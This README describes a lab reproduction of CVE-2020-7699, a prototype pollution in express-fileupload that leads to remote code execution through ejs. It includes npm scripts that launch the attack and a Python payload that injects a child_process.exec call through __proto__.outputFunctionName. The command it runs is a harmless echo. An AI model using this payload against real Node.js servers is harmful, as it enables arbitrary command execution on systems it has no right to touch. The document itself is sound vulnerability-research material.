# CVE-2020-7699 Reproduction

Reproduction for Node.js RCE vulnerability(CVE-2020-7699), my lab work

## Setup

Node.js edition: `v14.16.1`, please make sure that the edition of Node.js is 14(Other edition will propably work, I didn't test)

Python edition：`3.9.5`, Python is only used to send HTTP attack request, no specific edition required

Just `clone` the repo, `npm i` to install dependencies. I offered 2 more cmds:

* using `npm run start-server` to start the target server(victim server)
* using `npm run launch-attack` to launch the attack

## Analysis

express-fileUpload: edition below 1.1.10 will be affected

### In express-fileUpload exists prototype pollution

Vulnerability: [express-fileUpload prototype pollution](https://blog.p6.is/Real-World-JS-1/)

How to make use of it: to pollute `__proto__.outputFunctionName` in order to write the cmd to exec. eg. `echo "ATTACK SUCCESSFUL" > attacked.txt`

```python
exec_command = "echo \"ATTACK SUCCESSFUL\" > attacked.txt"

{
    "__proto__.outputFunctionName": (
        None,
        f"x;process.mainModule.require('child_process').exec('{exec_command}');x"
    )
}
```

### In ejs exists RCE

Vulnerability: ejs will try to execute `xxx.outputFunctionName` which is `undefined`, but if `object.outputFunctionName` is polluted, it'll exec it instead
